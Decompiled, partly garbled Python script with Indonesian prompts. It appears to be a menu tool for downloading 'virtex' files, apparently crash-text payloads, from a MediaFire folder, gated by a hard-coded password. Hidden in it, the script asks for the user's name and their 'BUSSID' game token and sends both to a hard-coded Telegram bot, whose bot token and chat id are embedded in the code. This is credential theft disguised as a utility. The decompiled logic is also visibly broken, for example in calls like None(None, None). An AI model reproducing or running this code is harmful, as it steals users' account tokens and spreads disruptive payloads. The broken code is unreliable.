# di hapus komentar nya semoga anda mandul
# Decode by FIRZAH
# Github: https://github.com/FIRandZAH
# WhatsApp: +62 831-7059-7744
# Time: Fri Nov 22 03:19:51 2024
# Decode Layers: 100
# File: firzah.pyc (Python 3.12)

from os import system
from time import sleep
import sys
import datetime
import os
import sys
import time
import requests
import json
import time
import threading
import os
import sys
from colorama import Fore, init
import itertools
import random
import socket
import shutil
import webbrowser
from concurrent.futures import futures as concurrent
import urllib3
import base64
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
import uuid
import getpass
os.system('cls||clear')
__import__('requests')
import requests
__import__('bs4')
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
__import__('colorama')
from colorama import Fore, init
__import__('rich')
import rich
from rich.table import Table as me
from rich.console import Console as sol
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
os.system('cls||clear')
if 'linux' in sys.platform:
    r = '\x1b[91m'
    g = '\x1b[92m'
    y = '\x1b[93m'
    p = '\x1b[94m'
    P = '\x1b[95m'
    c = '\x1b[96m'
    w = '\x1b[97m'
    a = '\x1b[0m'
for i in ('r', 'g', 'y', 'p', 'P', 'c', 'w', 'a'):
    globals()[i] = ''
    print(f''' {y}[{r}!{y}]  {y}SABAR MENGHUBUNGKAN KE SC NYA DULU COY{r}!!''')
    data = requests.get('https://www.mediafire.com/api/1.4/folder/get_content.php?content_type=files&filter=all&order_by=name&order_direction=asc&chunk=1&version=1.5&folder_key=ueti9cij4zf3i&response_format=json').json()
    files = data['response']['folder_content']['files']
    
    colors = lambda : random.choice([
r,
g,
y,
p,
P,
c,
w])
    os.mkdir('nijam')
    
    def Moya(file):
        sesi = requests.Session()
        print(f'''{p}[{y}!{p}] {y}Downloading {file['filename']}''')
        a = sesi.get(file['links']['normal_download'])
        b = parser(a.content, 'html.parser').find('a', class_ = 'popsok')['href']
        c = sesi.get(b).content
        d = os.path.join('virtex', file['filename'])
        e = os.open(d, os.O_CREAT | os.O_WRONLY)
        os.write(e, c)
        os.close(e)
        None(None, None)
        return None
        if not None:
            pass

    
    def main():
        os.system('cls||clear')
        for khaneysia, rahmat in enumerate(files, start = 1):
            print(f'''{p}[{r}{str(khaneysia).zfill(2)}{p}] {colors()}{os.path.splitext(rahmat['filename'])[0]}''')
            print(f'''{p}[{r}AL{p}] {c}UNDUH SEMUA VIRTEX\n{p}[{r}BA{p}] {y}KEMBALI KE MENU UTAMA\n{p}[{r}EX{p}] {r}KELUAR DARI PROGRAM''')
            echa = input(f'''{g!s}>>>> {c!s}''').lower()
            if echa == 'al':
                executor = concurrent.futures.ThreadPoolExecutor(15)
                executor.map(Moya, files)
                None(None, None)
                shutil.make_archive('virtex-master', 'zip', 'virtex')
                print(f'''{p}[{g}\xc3\xa2{p}] {g}Download Complete''')
                exit(f'''{p}[{g}\xc3\xa2{p}] {g}Download Results Saved In : {os.path.realpath('virtex')}''')
                return None
        if echa == 'ba':
            menu()
            return None
        if echa == 'ex':
            os.abort()
            return None
        if int(echa) in range(1, len(files) + 1):
            rahmet = files[int(echa) - 1]
            woi = 0
            print(f'''{p}[{y}!{p}] {y}Downloading {rahmet['filename']}''')
            ses = requests.Session()
            req = ses.get(rahmet['links']['normal_download'])
            res = parser(req.content, 'html.parser')
            print(f'''{p}[{y}\xc3\xa2{p}] {y}URL : {req.url}''')
            print(f'''{p}[{y}\xc3\xa2{p}] {y}Status : {req.status_code}''')
            url = res.find('a', class_ = 'popsok')['href']
            path = os.path.join('virtex', rahmet['filename'])
            file = os.open(path, os.O_CREAT | os.O_WRONLY)
            txt = ses.get(url).content
            os.write(file, txt)
            os.close(file)
            byte = os.stat(path).st_size
            for b in ('B', 'KB', 'MB', 'GB', 'TB'):
                if byte < 1024:
                    byte = '%3.2f %s' % (byte, b)
                byte /= 1024
                print(f'''{p}[{y}\xc3\xa2{p}] {g}File Name : {os.path.basename(path)}''')
                print(f'''{p}[{y}\xc3\xa2{p}] {g}File Size : {byte}''')
                print(f'''{p}[{y}\xc3\xa2{p}] {g}File Path : {os.path.realpath(path)}''')
                show = input(f'''{p}[{y}?{p}] {w}Lihat Hasil Download [{g}Y/{w}{r}n{w}] {P}''').lower() == 'y'
                if show:
                    os.system(f'''xdg-open --view virtex/\'{rahmet['filename']}\'''')
            time.sleep(0)
            main()
            return None
        raise ValueError()
        if not None:
            pass
        if requests.exceptions.RequestException:
            su = None
            woi += 1
            if woi >= 5:
                print(f'''{p}[{y}!{p}] {y}Gagal kehubung cuy :(\n\n\tCoba :\n\t\tâ¢ Nonaktifkan mode pesawat\n\t\tâ¢ Aktifkan data seluler atau Wi-Fi\n\t\tâ¢ Periksa sinyal di area Anda{a}''')
                su = None
                del su
                return None
            print(f'''{p}[{y}!{p}] {y}Bentar, coba hubungin ulang''')
            time.sleep(1.5)
            su = None
            del su
            su = None
            del su
        if ValueError:
            print(f'''{y}[!] Invalid Input!''')
            time.sleep(1)
            main()
            return None

    
    def countdownTimer(start_minute, start_second):
        total_second = start_minute * 1 + start_second
        if total_second:
            (mins, secs) = divmod(total_second, 1)
            time.sleep(0)
            total_second -= 1
            if total_second:
                pass
        print('\x1b[0;35m==========================')

    red = Fore.LIGHTRED_EX
    green = Fore.LIGHTGREEN_EX
    yellow = Fore.LIGHTYELLOW_EX
    blue = Fore.LIGHTBLUE_EX
    white = Fore.WHITE
    system('cls||clear')
    TOKEN = '7481271703:AAHvMpZCcd6hyOJ04LceAVzbRym2bYJoF9M'
    chat_id = '-4501707408'
    nama = input(f'''MASUKIN NAMA BANGGG: {yellow}''')
    url = f'''https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={nama}'''
    requests.get(url).json()
    
    def get_pass():
        pword = getpass.getpass(f'''{green}╭­\x1b[1;33;41m\x1b[1;37m❏ 𝐌𝐀𝐒𝐔𝐊𝚰𝐍 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 ❏\x1b[1;33m\x1b[0m\x1b[\n{green}╰───{yellow}▶''')
        return pword

    pword = get_pass()
    if not pword == 'uno':
        ketik(f'''{red}𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 𝐒𝐀𝐋𝐀𝐇 𝐁𝐑𝐎𝐎''')
        time.sleep(1)
        os.system('xdg-open https://api.whatsapp.com/send/?phone=6283130585272')
        system('clear')
        pword = get_pass()
        if not pword == 'uno':
            pass
print(f'''{green}GACORRR''')
system('cls||clear')

def print(c):
    for e in c + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        sleep(0)
        return None

[]['\n'][f'''{white}''']['████████╗ █████╗ ██████╗\n'][f'''{white}''']['╚══██╔══╝██╔══██╗██╔══██╗\n'][f'''{white}''']['   ██║   ██║  ██║██████╔╝\n'][f'''{white}''']['   ██║   ██║  ██║██╔═══╝\n'][f'''{white}''']['   ██║   ╚█████╔╝██║\n'][f'''{white}''']['   ╚═╝    ╚════╝ ╚═╝\n\n'][f'''{red}''']['██'][f'''{white}''']['╗   '][f'''{red}''']['██'][f'''{white}''']['╗'][f'''{red}''']['██████'][f'''{white}''']['╗\n'][f'''{red}''']['██'][f'''{white}''']['║   '][f'''{red}''']['██'][f'''{white}''']['║'][f'''{red}''']['██'][f'''{white}''']['╔══'][f'''{red}''']['██'][f'''{white}''']['╗\n'][f'''{red}''']['██'][f'''{white}''']['║   '][f'''{red}''']['██'][f'''{white}''']['║'][f'''{red}''']['██████'][f'''{white}''']['╔╝\n'][f'''{red}''']['██'][f'''{white}''']['║   '][f'''{red}''']['██'][f'''{white}''']['║'][f'''{red}''']['██'][f'''{white}''']['╔═══╝\n'][f'''{red}'''][f'''{white}''']['╚'][f'''{red}''']['██████'][f'''{white}''']['╔╝'][f'''{red}''']['██'][f'''{white}''']['║\n'][f'''{red}'''][' '][f'''{white}''']['╚═════╝ ╚═╝\n\n'][f'''{green}''']['██████'][f'''{white}''']['╗ '][f'''{green}''']['██'][f'''{white}''']['╗   '][f'''{green}''']['██'][f'''{white}''']['╗ '][f'''{green}''']['██████'][f'''{white}''']['╗ '][f'''{green}''']['██████'][f'''{white}''']['╗'][f'''{green}''']['██'][f'''{white}''']['╗'][f'''{green}''']['██████'][f'''{white}''']['╗\n'][f'''{green}''']['██'][f'''{white}''']['╔══'][f'''{green}''']['██'][f'''{white}''']['╗'][f'''{green}''']['██'][f'''{white}''']['║   '][f'''{green}''']['██'][f'''{white}''']['║'][f'''{green}''']['██'][f'''{white}''']['╔════╝'][f'''{green}''']['██'][f'''{white}''']['╔════╝'][f'''{green}''']['██'][f'''{white}''']['║'][f'''{green}''']['██'][f'''{white}''']['╔══'][f'''{green}''']['██'][f'''{white}''']['╗\n'][f'''{green}''']['██████'][f'''{white}''']['╦╝'][f'''{green}''']['██'][f'''{white}''']['║   '][f'''{green}''']['██'][f'''{white}''']['║╚'][f'''{green}''']['█████'][f'''{white}''']['╗ ╚'][f'''{green}''']['█████'][f'''{white}''']['╗ '][f'''{green}''']['██'][f'''{white}''']['║'][f'''{green}''']['██'][f'''{white}''']['║  '][f'''{green}''']['██'][f'''{white}''']['║\n'][f'''{green}''']['██'][f'''{white}''']['╔══'][f'''{green}''']['██'][f'''{white}''']['╗'][f'''{green}''']['██'][f'''{white}''']['║   '][f'''{green}''']['██'][f'''{white}''']['║ ╚═══'][f'''{green}''']['██'][f'''{white}''']['╗ ╚═══'][f'''{green}''']['██'][f'''{white}''']['╗'][f'''{green}''']['██'][f'''{white}''']['║'][f'''{green}''']['██'][f'''{white}''']['║  '][f'''{green}''']['██'][f'''{white}''']['║\n'][f'''{green}''']['██████'][f'''{white}''']['╦╝╚'][f'''{green}''']['██████'][f'''{white}''']['╔╝'][f'''{green}''']['██████'][f'''{white}''']['╔╝'][f'''{green}''']['██████'][f'''{white}''']['╔╝'][f'''{green}''']['██'][f'''{white}''']['║'][f'''{green}''']['██████'][f'''{white}''']['╔╝\n'][f'''{green}''']([]['\n'][f'''{white}''']['████████╗ █████╗ ██████╗\n'][f'''{white}''']['╚══██╔══╝██╔══██╗██╔══██╗\n'][f'''{white}''']['   ██║   ██║  ██║██████╔╝\n'][f'''{white}''']['   ██║   ██║  ██║██╔═══╝\n'][f'''{white}''']['   ██║   ╚█████╔╝██║\n'][f'''{white}''']['   ╚═╝    ╚════╝ ╚═╝\n\n'][f'''{red}''']['██'][f'''{white}''']['╗   '][f'''{red}''']['██'][f'''{white}''']['╗'][f'''{red}''']['██████'][f'''{white}''']['╗\n'][f'''{red}''']['██'][f'''{white}''']['║   '][f'''{red}''']['██'][f'''{white}''']['║'][f'''{red}''']['██'][f'''{white}''']['╔══'][f'''{red}''']['██'][f'''{white}''']['╗\n'][f'''{red}''']['██'][f'''{white}''']['║   '][f'''{red}''']['██'][f'''{white}''']['║'][f'''{red}''']['██████'][f'''{white}''']['╔╝\n'][f'''{red}''']['██'][f'''{white}''']['║   '][f'''{red}''']['██'][f'''{white}''']['║'][f'''{red}''']['██'][f'''{white}''']['╔═══╝\n'][f'''{red}'''][f'''{white}''']['╚'][f'''{red}''']['██████'][f'''{white}''']['╔╝'][f'''{red}''']['██'][f'''{white}''']['║\n'][f'''{red}'''][' '][f'''{white}''']['╚═════╝ ╚═╝\n\n'][f'''{green}''']['██████'][f'''{white}''']['╗ '][f'''{green}''']['██'][f'''{white}''']['╗   '][f'''{green}''']['██'][f'''{white}''']['╗ '][f'''{green}''']['██████'][f'''{white}''']['╗ '][f'''{green}''']['██████'][f'''{white}''']['╗'][f'''{green}''']['██'][f'''{white}''']['╗'][f'''{green}''']['██████'][f'''{white}''']['╗\n'][f'''{green}''']['██'][f'''{white}''']['╔══'][f'''{green}''']['██'][f'''{white}''']['╗'][f'''{green}''']['██'][f'''{white}''']['║   '][f'''{green}''']['██'][f'''{white}''']['║'][f'''{green}''']['██'][f'''{white}''']['╔════╝'][f'''{green}''']['██'][f'''{white}''']['╔════╝'][f'''{green}''']['██'][f'''{white}''']['║'][f'''{green}''']['██'][f'''{white}''']['╔══'][f'''{green}''']['██'][f'''{white}''']['╗\n'][f'''{green}''']['██████'][f'''{white}''']['╦╝'][f'''{green}''']['██'][f'''{white}''']['║   '][f'''{green}''']['██'][f'''{white}''']['║╚'][f'''{green}''']['█████'][f'''{white}''']['╗ ╚'][f'''{green}''']['█████'][f'''{white}''']['╗ '][f'''{green}''']['██'][f'''{white}''']['║'][f'''{green}''']['██'][f'''{white}''']['║  '][f'''{green}''']['██'][f'''{white}''']['║\n'][f'''{green}''']['██'][f'''{white}''']['╔══'][f'''{green}''']['██'][f'''{white}''']['╗'][f'''{green}''']['██'][f'''{white}''']['║   '][f'''{green}''']['██'][f'''{white}''']['║ ╚═══'][f'''{green}''']['██'][f'''{white}''']['╗ ╚═══'][f'''{green}''']['██'][f'''{white}''']['╗'][f'''{green}''']['██'][f'''{white}''']['║'][f'''{green}''']['██'][f'''{white}''']['║  '][f'''{green}''']['██'][f'''{white}''']['║\n'][f'''{green}''']['██████'][f'''{white}''']['╦╝╚'][f'''{green}''']['██████'][f'''{white}''']['╔╝'][f'''{green}''']['██████'][f'''{white}''']['╔╝'][f'''{green}''']['██████'][f'''{white}''']['╔╝'][f'''{green}''']['██'][f'''{white}''']['║'][f'''{green}''']['██████'][f'''{white}''']['╔╝\n'][f'''{green}'''][f'''{white}''']([]['\n'][f'''{white}''']['████████╗ █████╗ ██████╗\n'][f'''{white}''']['╚══██╔══╝██╔══██╗██╔══██╗\n'][f'''{white}''']['   ██║   ██║  ██║██████╔╝\n'][f'''{white}''']['   ██║   ██║  ██║██╔═══╝\n'][f'''{white}''']['   ██║   ╚█████╔╝██║\n'][f'''{white}''']['   ╚═╝    ╚════╝ ╚═╝\n\n'][f'''{red}''']['██'][f'''{white}''']['╗   '][f'''{red}''']['██'][f'''{white}''']['╗'][f'''{red}''']['██████'][f'''{white}''']['╗\n'][f'''{red}''']['██'][f'''{white}''']['║   '][f'''{red}''']['██'][f'''{white}''']['║'][f'''{red}''']['██'][f'''{white}''']['╔══'][f'''{red}''']['██'][f'''{white}''']['╗\n'][f'''{red}''']['██'][f'''{white}''']['║   '][f'''{red}''']['██'][f'''{white}''']['║'][f'''{red}''']['██████'][f'''{white}''']['╔╝\n'][f'''{red}''']['██'][f'''{white}''']['║   '][f'''{red}''']['██'][f'''{white}''']['║'][f'''{red}''']['██'][f'''{white}''']['╔═══╝\n'][f'''{red}'''][f'''{white}''']['╚'][f'''{red}''']['██████'][f'''{white}''']['╔╝'][f'''{red}''']['██'][f'''{white}''']['║\n'][f'''{red}'''][' '][f'''{white}''']['╚═════╝ ╚═╝\n\n'][f'''{green}''']['██████'][f'''{white}''']['╗ '][f'''{green}''']['██'][f'''{white}''']['╗   '][f'''{green}''']['██'][f'''{white}''']['╗ '][f'''{green}''']['██████'][f'''{white}''']['╗ '][f'''{green}''']['██████'][f'''{white}''']['╗'][f'''{green}''']['██'][f'''{white}''']['╗'][f'''{green}''']['██████'][f'''{white}''']['╗\n'][f'''{green}''']['██'][f'''{white}''']['╔══'][f'''{green}''']['██'][f'''{white}''']['╗'][f'''{green}''']['██'][f'''{white}''']['║   '][f'''{green}''']['██'][f'''{white}''']['║'][f'''{green}''']['██'][f'''{white}''']['╔════╝'][f'''{green}''']['██'][f'''{white}''']['╔════╝'][f'''{green}''']['██'][f'''{white}''']['║'][f'''{green}''']['██'][f'''{white}''']['╔══'][f'''{green}''']['██'][f'''{white}''']['╗\n'][f'''{green}''']['██████'][f'''{white}''']['╦╝'][f'''{green}''']['██'][f'''{white}''']['║   '][f'''{green}''']['██'][f'''{white}''']['║╚'][f'''{green}''']['█████'][f'''{white}''']['╗ ╚'][f'''{green}''']['█████'][f'''{white}''']['╗ '][f'''{green}''']['██'][f'''{white}''']['║'][f'''{green}''']['██'][f'''{white}''']['║  '][f'''{green}''']['██'][f'''{white}''']['║\n'][f'''{green}''']['██'][f'''{white}''']['╔══'][f'''{green}''']['██'][f'''{white}''']['╗'][f'''{green}''']['██'][f'''{white}''']['║   '][f'''{green}''']['██'][f'''{white}''']['║ ╚═══'][f'''{green}''']['██'][f'''{white}''']['╗ ╚═══'][f'''{green}''']['██'][f'''{white}''']['╗'][f'''{green}''']['██'][f'''{white}''']['║'][f'''{green}''']['██'][f'''{white}''']['║  '][f'''{green}''']['██'][f'''{white}''']['║\n'][f'''{green}''']['██████'][f'''{white}''']['╦╝╚'][f'''{green}''']['██████'][f'''{white}''']['╔╝'][f'''{green}''']['██████'][f'''{white}''']['╔╝'][f'''{green}''']['██████'][f'''{white}''']['╔╝'][f'''{green}''']['██'][f'''{white}''']['║'][f'''{green}''']['██████'][f'''{white}''']['╔╝\n'][f'''{green}'''][f'''{white}''']['╚═════╝  ╚═════╝ ╚═════╝ ╚═════╝ ╚═╝╚═════╝ ']))
hh = input(f''' \x1b[1;33;41m\x1b[1;37[MASUKIN TOKEN BUSSID MU BELENG \x1b[1;33m: \x1b[0m\x1b[ : {green}''')
url = f'''https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={hh}'''
requests.get(url).json()
os.system('cls||clear')

def print(c):
    for e in c + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        sleep(0)
        return None

kal = datetime.datetime.now()

def menu1():
    system('cls||clear')
    sys.stdout.write(e)
    sys.stdout.flush()
    sleep(0)

print(f'''{green}╔══════════════════════════════════════════════════════════════════════════╗''')
print(f'''{green}║ {yellow}██████{white}╗ {yellow}██{white}╗   {yellow}██{white}╗{yellow}███████{white}╗''')
print(f'''{green}║ {yellow}██{white}╔══{yellow}██{white}╗{yellow}██{white}║   {yellow}██{white}║{yellow}██{white}╔════╝''')
print(f'''{green}║ {yellow}██████{white}╔╝{yellow}██{white}║   {yellow}██{white}║{yellow}███████{white}╗''')
print(f'''{green}║ {yellow}██{white}╔══{yellow}██{white}╗{yellow}██{white}║   {yellow}██{white}║╚════{yellow}██{white}║''')
print(f'''{green}║ {yellow}██████{white}╔╝╚{yellow}██████{white}╔╝{yellow}███████{white}║''')
print(f'''{green}║ {white}╚═════╝  ╚═════╝ ╚══════╝''')
[][f'''{green}''']['║ '][f'''{yellow}''']['███████'][f'''{white}''']['╗'][f'''{yellow}''']['██'][f'''{white}''']['╗'][f'''{yellow}''']['███'][f'''{white}''']['╗   '][f'''{yellow}''']['███'][f'''{white}''']['╗'][f'''{yellow}''']['██'][f'''{white}''']['╗   '][f'''{yellow}''']['██'][f'''{white}''']['╗'][f'''{yellow}''']['██'][f'''{white}''']['╗      '][f'''{yellow}''']['█████'][f'''{white}''']['╗ '][f'''{yellow}''']['████████'][f'''{white}''']['╗ '][f'''{yellow}''']['██████'][f'''{white}''']['╗ '][f'''{yellow}''']['██████']([][f'''{green}''']['║ '][f'''{yellow}''']['███████'][f'''{white}''']['╗'][f'''{yellow}''']['██'][f'''{white}''']['╗'][f'''{yellow}''']['███'][f'''{white}''']['╗   '][f'''{yellow}''']['███'][f'''{white}''']['╗'][f'''{yellow}''']['██'][f'''{white}''']['╗   '][f'''{yellow}''']['██'][f'''{white}''']['╗'][f'''{yellow}''']['██'][f'''{white}''']['╗      '][f'''{yellow}''']['█████'][f'''{white}''']['╗ '][f'''{yellow}''']['████████'][f'''{white}''']['╗ '][f'''{yellow}''']['██████'][f'''{white}''']['╗ '][f'''{yellow}''']['██████'][f'''{white}''']([][f'''{green}''']['║ '][f'''{yellow}''']['███████'][f'''{white}''']['╗'][f'''{yellow}''']['██'][f'''{white}''']['╗'][f'''{yellow}''']['███'][f'''{white}''']['╗   '][f'''{yellow}''']['███'][f'''{white}''']['╗'][f'''{yellow}''']['██'][f'''{white}''']['╗   '][f'''{yellow}''']['██'][f'''{white}''']['╗'][f'''{yellow}''']['██'][f'''{white}''']['╗      '][f'''{yellow}''']['█████'][f'''{white}''']['╗ '][f'''{yellow}''']['████████'][f'''{white}''']['╗ '][f'''{yellow}''']['██████'][f'''{white}''']['╗ '][f'''{yellow}''']['██████'][f'''{white}''']['╗']))
[][f'''{green}''']['║ '][f'''{yellow}''']['██'][f'''{white}''']['╔════╝'][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['████'][f'''{white}''']['╗ '][f'''{yellow}''']['████'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║  '][f'''{yellow}'''][' ██'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║     '][f'''{yellow}''']['██'][f'''{white}''']['╔══'][f'''{yellow}''']['██'][f'''{white}''']['╗╚══'][f'''{yellow}''']['██'][f'''{white}''']['╔══╝'][f'''{yellow}''']['██'][f'''{white}''']['╔═══'][f'''{yellow}''']['██'][f'''{white}''']['╗'][f'''{yellow}''']['██'][f'''{white}''']['╔══'][f'''{yellow}''']['██']([][f'''{green}''']['║ '][f'''{yellow}''']['██'][f'''{white}''']['╔════╝'][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['████'][f'''{white}''']['╗ '][f'''{yellow}''']['████'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║  '][f'''{yellow}'''][' ██'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║     '][f'''{yellow}''']['██'][f'''{white}''']['╔══'][f'''{yellow}''']['██'][f'''{white}''']['╗╚══'][f'''{yellow}''']['██'][f'''{white}''']['╔══╝'][f'''{yellow}''']['██'][f'''{white}''']['╔═══'][f'''{yellow}''']['██'][f'''{white}''']['╗'][f'''{yellow}''']['██'][f'''{white}''']['╔══'][f'''{yellow}''']['██'][f'''{white}''']([][f'''{green}''']['║ '][f'''{yellow}''']['██'][f'''{white}''']['╔════╝'][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['████'][f'''{white}''']['╗ '][f'''{yellow}''']['████'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║  '][f'''{yellow}'''][' ██'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║     '][f'''{yellow}''']['██'][f'''{white}''']['╔══'][f'''{yellow}''']['██'][f'''{white}''']['╗╚══'][f'''{yellow}''']['██'][f'''{white}''']['╔══╝'][f'''{yellow}''']['██'][f'''{white}''']['╔═══'][f'''{yellow}''']['██'][f'''{white}''']['╗'][f'''{yellow}''']['██'][f'''{white}''']['╔══'][f'''{yellow}''']['██'][f'''{white}''']['╗']))
[][f'''{green}''']['║ '][f'''{yellow}''']['███████'][f'''{white}''']['╗'][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['╔'][f'''{yellow}''']['████'][f'''{white}''']['╔'][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║     '][f'''{yellow}''']['███████'][f'''{white}''']['║   '][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['██████']([][f'''{green}''']['║ '][f'''{yellow}''']['███████'][f'''{white}''']['╗'][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['╔'][f'''{yellow}''']['████'][f'''{white}''']['╔'][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║     '][f'''{yellow}''']['███████'][f'''{white}''']['║   '][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['██████'][f'''{white}''']([][f'''{green}''']['║ '][f'''{yellow}''']['███████'][f'''{white}''']['╗'][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['╔'][f'''{yellow}''']['████'][f'''{white}''']['╔'][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║     '][f'''{yellow}''']['███████'][f'''{white}''']['║   '][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['██████'][f'''{white}''']['╔╝']))
[][f'''{green}''']['║ '][f'''{white}''']['╚════'][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║╚'][f'''{yellow}''']['██'][f'''{white}''']['╔╝'][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║     '][f'''{yellow}''']['██'][f'''{white}''']['╔══'][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['╔══'][f'''{yellow}''']['██']([][f'''{green}''']['║ '][f'''{white}''']['╚════'][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║╚'][f'''{yellow}''']['██'][f'''{white}''']['╔╝'][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║     '][f'''{yellow}''']['██'][f'''{white}''']['╔══'][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['╔══'][f'''{yellow}''']['██'][f'''{white}''']([][f'''{green}''']['║ '][f'''{white}''']['╚════'][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║╚'][f'''{yellow}''']['██'][f'''{white}''']['╔╝'][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║     '][f'''{yellow}''']['██'][f'''{white}''']['╔══'][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['╔══'][f'''{yellow}''']['██'][f'''{white}''']['╗']))
[][f'''{green}''']['║ '][f'''{yellow}''']['███████'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║ ╚═╝ '][f'''{yellow}''']['██'][f'''{white}''']['║╚'][f'''{yellow}''']['██████'][f'''{white}''']['╔╝'][f'''{yellow}''']['███████'][f'''{white}''']['╗'][f'''{yellow}''']['██'][f'''{white}''']['║  '][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{white}''']['╚'][f'''{yellow}''']['██████'][f'''{white}''']['╔╝'][f'''{yellow}''']['██'][f'''{white}''']['║  '][f'''{yellow}''']['██']([][f'''{green}''']['║ '][f'''{yellow}''']['███████'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║ ╚═╝ '][f'''{yellow}''']['██'][f'''{white}''']['║╚'][f'''{yellow}''']['██████'][f'''{white}''']['╔╝'][f'''{yellow}''']['███████'][f'''{white}''']['╗'][f'''{yellow}''']['██'][f'''{white}''']['║  '][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{white}''']['╚'][f'''{yellow}''']['██████'][f'''{white}''']['╔╝'][f'''{yellow}''']['██'][f'''{white}''']['║  '][f'''{yellow}''']['██'][f'''{white}''']([][f'''{green}''']['║ '][f'''{yellow}''']['███████'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║ ╚═╝ '][f'''{yellow}''']['██'][f'''{white}''']['║╚'][f'''{yellow}''']['██████'][f'''{white}''']['╔╝'][f'''{yellow}''']['███████'][f'''{white}''']['╗'][f'''{yellow}''']['██'][f'''{white}''']['║  '][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{white}''']['╚'][f'''{yellow}''']['██████'][f'''{white}''']['╔╝'][f'''{yellow}''']['██'][f'''{white}''']['║  '][f'''{yellow}''']['██'][f'''{white}''']['║']))
print(f'''{green}║ {white}╚══════╝╚═╝╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝''')
print(f'''{green}║ {yellow}██{white}╗{yellow}██████{white}╗''')
